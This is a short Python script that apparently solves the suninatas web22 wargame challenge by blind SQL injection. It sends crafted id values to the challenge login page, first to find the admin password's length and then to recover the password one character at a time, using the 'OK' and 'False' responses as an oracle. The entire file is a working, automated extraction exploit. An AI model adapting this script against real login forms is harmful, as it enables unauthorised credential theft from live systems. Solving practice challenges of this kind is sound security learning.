import requests

def request(uid):
	url = f'http://suninatas.com/challenge/web22/web22.asp?id={uid}&pw=1234'
	response = requests.get(url)
	return response

def find_len_pw():
	for num in range(1,30):
		uid = f'admin\' and len(pw)>{num}--'
		response = request(uid)
		if "False" in response.text:
			print("Finally I can get pw len: ",num)
			break
	return num

def solve(len_pw):
	
	res = ""
	for idx in range(1,len_pw+1):
		for i in range(33,127):
			uid = f'admin\' and substring(pw,{idx},1) = \''+chr(i)+'\'--'
			response = request(uid)
			if "OK" in response.text:
				print(f"Wait! I find {idx}'s letter : ",chr(i))
				res += chr(i)
				break
	print(res)

if __name__ == "__main__":
	len_pw = find_len_pw()
	solve(len_pw)	
